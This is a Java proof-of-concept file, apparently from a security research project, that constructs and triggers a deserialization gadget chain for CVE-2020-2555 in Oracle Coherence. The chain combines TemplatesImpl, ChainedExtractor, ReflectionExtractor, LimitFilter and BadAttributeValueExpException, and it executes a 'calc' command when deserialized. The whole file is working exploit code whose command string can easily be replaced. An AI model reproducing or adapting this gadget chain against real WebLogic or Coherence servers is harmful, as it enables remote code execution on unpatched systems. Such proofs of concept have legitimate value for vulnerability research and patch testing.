package com.feihong.testcase;

import com.feihong.utils.Gadgets;
import com.feihong.utils.Util;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.tangosol.util.ValueExtractor;
import com.tangosol.util.extractor.ChainedExtractor;
import com.tangosol.util.extractor.ReflectionExtractor;
import com.tangosol.util.filter.LimitFilter;
import javax.management.BadAttributeValueExpException;
import java.lang.reflect.Field;

public class TestTemplatesImplWithCVE_2020_2555 {
    public static void main(String args[]) throws Exception {

        final Object eveiObject = Gadgets.createTemplatesImpl("java.lang.Runtime.getRuntime().exec(\"calc\");");

        ReflectionExtractor extractor1 = new ReflectionExtractor(
                "getMethod",
                new Object[]{"newTransformer", new Class[0]}
        );

        ReflectionExtractor extractor2 = new ReflectionExtractor(
                "invoke",
                new Object[]{eveiObject , new Object[0]}

        );

        ValueExtractor[] valueExtractors = new ValueExtractor[]{
                extractor1,
                extractor2
        };

        ChainedExtractor chainedExtractor = new ChainedExtractor(valueExtractors);
        LimitFilter limitFilter = new LimitFilter();

        //m_comparator
        Field m_comparator = limitFilter.getClass().getDeclaredField("m_comparator");
        m_comparator.setAccessible(true);
        m_comparator.set(limitFilter, chainedExtractor);

        //m_oAnchorTop
        Field m_oAnchorTop = limitFilter.getClass().getDeclaredField("m_oAnchorTop");
        m_oAnchorTop.setAccessible(true);
        m_oAnchorTop.set(limitFilter, TemplatesImpl.class);

        BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(null);
        Field field = badAttributeValueExpException.getClass().getDeclaredField("val");
        field.setAccessible(true);
        field.set(badAttributeValueExpException, limitFilter);

        //序列化
        byte[] bytes = Util.serialize(badAttributeValueExpException);

        //反序列化
        Util.deserialize(bytes);
    }
}
